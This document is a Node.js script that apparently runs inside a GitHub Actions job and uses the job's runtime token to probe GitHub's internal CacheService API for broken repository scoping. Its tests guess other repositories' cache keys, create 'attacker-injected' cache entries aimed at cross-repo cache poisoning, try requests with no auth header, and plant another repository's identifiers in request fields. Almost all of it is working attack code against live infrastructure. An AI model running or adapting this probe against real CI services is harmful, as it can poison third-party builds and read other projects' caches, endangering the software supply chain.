const https = require('https');
const crypto = require('crypto');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_REF = process.env.GITHUB_REF || '';

function req(host, path, body) {
  return new Promise((resolve) => {
    const s = JSON.stringify(body);
    const r = https.request({
      hostname: host, path, method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + RUNTIME_TOKEN,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(s),
      }
    }, (res) => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 800) }));
    });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  if (!RESULTS_URL || !RUNTIME_TOKEN) { console.log('Missing env'); return; }
  const host = new URL(RESULTS_URL).hostname;

  console.log('=== ENVIRONMENT ===');
  console.log('Host:', host);
  console.log('Repo:', GITHUB_REPOSITORY);
  console.log('Ref:', GITHUB_REF);
  console.log('Orch:', ORCHESTRATION_ID);

  // CacheService: GetCacheEntryDownloadURL, CreateCacheEntry, FinalizeCacheEntryUpload
  // All accepted RUNTIME_TOKEN without 401. Now sending valid fields.

  // Version is sha256(key + paths) per @actions/cache toolkit
  // Let's use valid cache keys that might exist in GitHub's own workflows
  const TEST_KEY = 'npm-test-cache-key';
  const TEST_VERSION = crypto.createHash('sha256').update(TEST_KEY + '\nnode_modules').digest('hex');

  console.log('\n=== CacheService GetCacheEntryDownloadURL ===');

  // Test A: Valid key+version with no scope ID (no run/repo field)
  const rA = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: TEST_KEY,
    version: TEST_VERSION,
  });
  console.log('[A] No scope field — Status:', rA.status, '| Body:', rA.body);

  // Test B: With restore_keys (alternate lookup keys)
  const rB = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: TEST_KEY,
    version: TEST_VERSION,
    restore_keys: ['npm-test', 'npm'],
  });
  console.log('[B] With restore_keys — Status:', rB.status, '| Body:', rB.body);

  // Test C: Try a key that public repos commonly use (node_modules cache)
  // If the cache service is NOT scoped by repo, we might hit other repos' caches
  const commonKeys = [
    { key: 'node-modules-ubuntu-', version: crypto.createHash('sha256').update('package-lock.json').digest('hex') },
    { key: 'npm-', version: crypto.createHash('sha256').update('node_modules\npackage-lock.json').digest('hex') },
    { key: 'v1-npm-', version: crypto.createHash('sha256').update('node_modules').digest('hex') },
  ];

  console.log('\n=== Probing common cache keys (cross-repo test) ===');
  for (const { key, version } of commonKeys) {
    const r = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
      key, version,
    });
    // 200 with ok:true = cache hit — CRITICAL if this cache is from another repo
    // 200 with ok:false = cache miss (properly scoped, no cross-repo access)
    // 400 = missing required field
    // 401 = auth rejected (expected for cross-repo cache in properly scoped system)
    console.log(`[CROSS] key=${key.substring(0, 20)}...: ${r.status} | ${r.body.substring(0, 200)}`);
  }

  // Test D: CreateCacheEntry — can we create a cache entry without proper run scope?
  // If we can create entries that OTHER repos will load when they do actions/cache restore,
  // this is cross-repo cache poisoning (attacker influences another repo's build)
  console.log('\n=== CacheService CreateCacheEntry (scope test) ===');
  const rD = await req(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: 'attacker-injected-key-' + Date.now(),
    version: TEST_VERSION,
  });
  console.log('[D] CreateCacheEntry — Status:', rD.status, '| Body:', rD.body);

  // If D returned a signed upload URL, we could upload content and see if another repo's
  // cache restore picks it up. For now, just document if we got a URL.

  // Test E: Try GetCacheEntryDownloadURL without Authorization to see if URL-in-path auth works
  // Cache service uses session token in URL (like artifact cache), check if Auth header is optional
  const rE = await new Promise((resolve) => {
    const s = JSON.stringify({ key: TEST_KEY, version: TEST_VERSION });
    const r = https.request({
      hostname: host, path: '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL',
      method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s) }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 200) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
  console.log('\n[E] CacheService WITHOUT auth header — Status:', rE.status, '| Body:', rE.body);

  // Test F: What if the cache is scoped to THIS workflow's key?
  // Try getting a cache entry we ACTUALLY created in this run
  console.log('\n=== CreateCacheEntry + GetCacheEntryDownloadURL (create then read) ===');
  const myKey = 'probe-v8-cache-' + ORCHESTRATION_ID.split('.')[0].substring(0, 8);
  const myVersion = crypto.createHash('sha256').update(myKey).digest('hex');

  const rF1 = await req(host, '/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', {
    key: myKey, version: myVersion,
  });
  console.log('[F1] CreateCacheEntry mine:', rF1.status, '|', rF1.body.substring(0, 300));

  // If CreateCacheEntry returns a signedUploadUrl, try to FinalizeCacheEntryUpload
  if (rF1.status === 200 && rF1.body.includes('signedUploadUrl')) {
    try {
      const parsed = JSON.parse(rF1.body);
      console.log('!!! Got signedUploadUrl:', parsed.signedUploadUrl ? parsed.signedUploadUrl.substring(0, 100) : 'empty');
      console.log('CacheId:', parsed.cacheId);

      // Finalize the upload (even without uploading data, to test scope)
      if (parsed.cacheId) {
        const rF2 = await req(host, '/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', {
          cacheId: parsed.cacheId,
          sizeMb: 0,
        });
        console.log('[F2] FinalizeCacheEntryUpload:', rF2.status, '|', rF2.body);
      }
    } catch(e) { console.log('Parse error:', e.message); }
  }

  // Test G: Read our own cache back
  const rG = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: myKey, version: myVersion,
  });
  console.log('[G] GetCacheEntryDownloadURL mine:', rG.status, '|', rG.body.substring(0, 300));

  // Test H: Check what scope information leaks from error messages
  // The "invalid_argument" errors in v7 showed: "key invalid length", then "version invalid length"
  // Does any error reveal repo scope info?
  console.log('\n=== Error message scope leak test ===');
  const rH = await req(host, '/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', {
    key: 'x', version: 'v',
    // Send unexpected fields to see error detail
    repository: 'other-org/other-repo',
    workflowRunId: '99999999-0000-0000-0000-000000000000',
  });
  console.log('[H] Extra fields in request:', rH.status, '|', rH.body);
}

main().catch(e => console.log('Fatal:', e.message));
